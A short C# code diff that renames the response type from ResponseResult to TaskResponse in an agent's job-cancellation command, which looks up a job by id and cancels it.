@@ -22,7 +22,7 @@ namespace Agent
             ServerJob jobToKill;
 
             if (!this.messageManager.TryGetJob(args["id"], out jobToKill)){
-                await messageManager.AddResponse(new ResponseResult()
+                await messageManager.AddResponse(new TaskResponse()
                 {
                     task_id = job.task.id,
                     user_output = "Job not found.",
@@ -33,7 +33,7 @@ namespace Agent
 
             jobToKill.cancellationtokensource.Cancel();
             
-            await messageManager.AddResponse(new ResponseResult()
+            await messageManager.AddResponse(new TaskResponse()
             {
                 task_id = job.task.id,
                 user_output = "Cancellation request sent.",
